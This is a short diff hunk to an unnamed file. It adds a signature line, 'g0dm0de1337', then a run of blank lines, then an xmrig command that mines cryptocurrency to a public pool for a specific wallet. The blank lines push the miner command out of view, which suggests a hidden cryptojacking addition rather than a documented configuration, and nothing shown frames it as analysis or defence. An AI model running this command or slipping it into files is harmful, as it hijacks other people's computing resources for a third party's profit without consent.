@@ -37,3 +37,9 @@ ______________
 
 
 - g0dm0de1337
+
+
+
+
+
+xmrig --url pool.hashvault.pro:443 --user 49dW7K53TPSRLnbXMfK7unhoTQjm5KmUnQLk9w51rHq5EAB6YWaLxb6KqhqhK5NcdQBqJMFxUgj7o44Wyu1SqZvWNuS9scU --pass GottModus --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
